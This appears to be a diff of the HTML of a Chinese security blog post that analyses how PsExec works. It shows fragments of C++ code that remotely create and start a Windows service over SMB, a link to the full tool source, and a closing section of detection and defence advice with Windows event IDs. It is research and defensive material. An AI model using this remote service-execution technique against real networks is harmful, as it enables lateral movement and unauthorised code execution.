+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span>BOOL <span style=color:#a6e22e>CreateServiceWithSCM</span>(LPCWSTR lpwsSCMServer, LPCWSTR lpwsServiceName, LPCWSTR lpwsServicePath)
 </span></span><span style=display:flex><span>{
 </span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>wcout <span style=color:#f92672>&lt;&lt;</span> TEXT(<span style=color:#e6db74>&#34;Will Create Service &#34;</span>) <span style=color:#f92672>&lt;&lt;</span> lpwsServiceName <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
 </span></span><span style=display:flex><span>    SC_HANDLE hSCM;
@@ -394,7 +790,128 @@
 </span></span><span style=display:flex><span>    
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>获得SCM句柄后调用<code>CreateService</code> 创建一个服务，最终调用<code>StartService</code> 完成整个服务的创建、启动过程。</p><p>效果如下：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9effa736-4f5f-11ec-b405-00d861bf4abb.png alt=2020-04-01-14-39-18></p></p><p>至此，整个Psexec工具原理分析与实践完成。</p><h2 id=0x07-psexec完整代码>0x07 PsExec完整代码</h2><p>代码我上传到了Github：<a href=https://github.com/Rvn0xsy/MyWin32CPP/blob/master/Psexec.cpp>https://github.com/Rvn0xsy/MyWin32CPP/blob/master/Psexec.cpp</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>// Psexec.cpp : 此文件包含 &#34;main&#34; 函数。程序执行将在此处开始并结束。
+</span></span></code></pre></td></tr></table></div></div><p>获得SCM句柄后调用<code>CreateService</code> 创建一个服务，最终调用<code>StartService</code> 完成整个服务的创建、启动过程。</p><p>效果如下：</p><p><img src=https://images.payloads.online/9effa736-4f5f-11ec-b405-00d861bf4abb.png alt=2020-04-01-14-39-18></p><p>至此，整个Psexec工具原理分析与实践完成。</p><h2 id=0x07-psexec完整代码>0x07 PsExec完整代码</h2><p>代码我上传到了Github：<a href=https://github.com/Rvn0xsy/MyWin32CPP/blob/master/Psexec.cpp>https://github.com/Rvn0xsy/MyWin32CPP/blob/master/Psexec.cpp</a></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">101
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">102
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">103
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">104
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">105
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">106
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">107
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">108
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">109
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">110
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">111
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">112
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">113
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">114
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">115
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">116
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">117
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">118
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">119
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">120
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">121
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>// Psexec.cpp : 此文件包含 &#34;main&#34; 函数。程序执行将在此处开始并结束。
 </span></span></span><span style=display:flex><span><span style=color:#75715e>//
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;iostream&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;WinSock2.h&gt;</span><span style=color:#75715e>
@@ -515,6 +1032,4 @@
 </span></span><span style=display:flex><span>    
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></div><h2 id=0x08-总结psexec防御>0x08 总结PsExec防御</h2><ol><li>如果内网大量机器使用SMB V2，可从网络协议上进行分析，着重监控<code>OpenSCManager</code></li><li>终端上进行事件监控如：创建服务、创建文件，根据HASH匹配能有效阻绝一部分攻击</li><li>服务器采用强口令，内网通用密码的情况太严重</li><li>在终端上日志着重采集以下事件ID</li></ol><ul><li>事件ID：4624</li><li>事件ID：4648</li><li>事件ID：7045</li><li>事件ID：7036</li></ul><p><strong>我的研究与总结可能不够严谨，欢迎斧正。</strong></p></div><div class=container><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=dark_tritanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div><div class=container><section class=bio itemprop=author itemscope itemtype=http://schema.org/Person><div class=bio__blurb><h2 class=site-h2>网络安全爱好者、安全工具开发者</h2><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p></div><div class=bio__avatar><img src=/avatar.jpeg alt="Duncan McDougall and heir apparent"></div></section></div></div><footer class=site-footer><div class=container><div class=site-footer__col><h5>Get in touch</h5><p>If you like my project or have some questions,feel free
-to contact me</a>.</p></div><div class="site-footer__col site-footer__col--links"><h5>Me Elsewhere</h5><ul><li><a href=https://twitter.com/Rvn0xsy><i class="fab fa-twitter"></i> Twitter</a></li><li><a href=mailto:rvn0xsy@gmail.com><i class="fas fa-envelope"></i> E-mail</a></li><li><a href=https://github.com/Rvn0xsy><i class="fab fa-github"></i> Github</a></li></ul></div><div class="site-footer__col site-footer__col--links"><h5>Meta Links</h5><ul><li><a href=/projects/><i class="fas fa-code"></i> Projects</a></li><li><a href=/links/><i class="fas fa-link"></i> Links</a></li><li><a href=/post/><i class="fa fa-file-alt"></i> Posts</a></li><li><a href=/index.xml><i class="fa fa-rss-square"></i> Rss</a></li><li><a href=/tools/><i class="fas fa-tools"></i> Tools</a></li></ul></div><p class=site-footer__copyright>© 倾旋 2021. All rights reserved.</p></div></footer><script src=https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin=anonymous></script>
-<script>(function(){let e="language-plantuml";Array.prototype.forEach.call(document.querySelectorAll("[class^="+e+"]"),function(e){let t=document.createElement("IMG");t.loading="lazy",t.src="http://www.plantuml.com/plantuml/svg/~1"+plantumlEncoder.encode(e.innerText),e.parentNode.insertBefore(t,e),e.style.display="none"})})()</script></body></html>
+</span></span></code></pre></td></tr></table></div></div><h2 id=0x08-总结psexec防御>0x08 总结PsExec防御</h2><ol><li>如果内网大量机器使用SMB V2，可从网络协议上进行分析，着重监控<code>OpenSCManager</code></li><li>终端上进行事件监控如：创建服务、创建文件，根据HASH匹配能有效阻绝一部分攻击</li><li>服务器采用强口令，内网通用密码的情况太严重</li><li>在终端上日志着重采集以下事件ID</li></ol><ul><li>事件ID：4624</li><li>事件ID：4648</li><li>事件ID：7045</li><li>事件ID：7036</li></ul><p><strong>我的研究与总结可能不够严谨，欢迎斧正。</strong></p></div><nav class="hide-on-mobile section-nav"><nav id=TableOfContents><ol><li><a href=#0x01-psexec>0x01 Psexec</a></li><li><a href=#0x02-psexec的执行原理>0x02 Psexec的执行原理</a><ol><li><a href=#查看安全日志>查看安全日志</a></li><li><a href=#查看系统日志>查看系统日志</a></li></ol></li><li><a href=#0x03-从网络分析psexec利用过程>0x03 从网络分析Psexec利用过程</a></li><li><a href=#0x04-连接smb共享>0x04 连接SMB共享</a><ol><li><a href=#关于smb上传文件>关于SMB上传文件</a></li></ol></li><li><a href=#0x05-编写服务程序>0x05 编写服务程序</a><ol><li><a href=#servicemain-函数>ServiceMain 函数</a></li></ol></li><li><a href=#0x06-使用windows-api远程管理服务>0x06 使用Windows API远程管理服务</a></li><li><a href=#0x07-psexec完整代码>0x07 PsExec完整代码</a></li><li><a href=#0x08-总结psexec防御>0x08 总结PsExec防御</a></li></ol></nav></nav></div><div class=post><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post></div></div><div class="footer wrapper"><nav class=nav><div>2020 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script><script>var enableTruncate=!0,filterDepth=!1;const MAX_DEPTH=9;window.addEventListener("DOMContentLoaded",()=>{const e=new IntersectionObserver(e=>{e.reverse().forEach(e=>{const n=e.target.getAttribute("id");if(e.intersectionRatio>0){var t=document.querySelectorAll(`nav li a[href="#${n}"]`);t!=null&&t.forEach(e=>{if(e!=null){var t=getDepth(e.parentElement);filterDepth&&t<=MAX_DEPTH&&(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))}else filterDepth||(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))})}})});document.querySelectorAll("h1[id],h2[id],h3[id],h4[id]").forEach(t=>{e.observe(t)})});function isVisible(e){if(!(e instanceof Element))return!1;const n=getComputedStyle(e);if(n.display==="none")return!1;if(n.visibility!=="visible")return!1;if(n.opacity<.1)return!1;if(e.offsetWidth+e.offsetHeight+e.getBoundingClientRect().height+e.getBoundingClientRect().width===0)return!1;const t={x:e.getBoundingClientRect().left+e.offsetWidth/2,y:e.getBoundingClientRect().top+e.offsetHeight/2};if(t.x<0)return!1;if(t.x>(document.documentElement.clientWidth||window.innerWidth))return!1;if(t.y<0)return!1;if(t.y>(document.documentElement.clientHeight||window.innerHeight))return!1;let s=document.elementFromPoint(t.x,t.y);do if(s===e)return!0;while(s=s.parentNode)return!1}function clearActiveStatesInTableOfContents(){document.querySelectorAll("nav li").forEach(e=>{e.classList.remove("active")})}function getDepth(e){for(var t=0;e!==null&&e.tagName.toLowerCase()!=="ul";)t++,e=e.parentElement;return t}function navItems(){var e=document.querySelectorAll("nav nav li a");return Array.from(e).filter(e=>e.href!=null&&e.hash.startsWith("#"))}function lasItemInNavBarVisible(){var e=navItems().slice(-1)[0];return isVisible(e)}document.addEventListener("DOMContentLoaded",function(){if(!enableTruncate)return;var e=navItems();console.log(e),lasItemInNavBarVisible()||(filterDepth=!0,e.forEach(function(e){var t=getDepth(e.parentElement);t>MAX_DEPTH&&e.parentElement.classList.add("depth-nested")}))})</script></body></html>
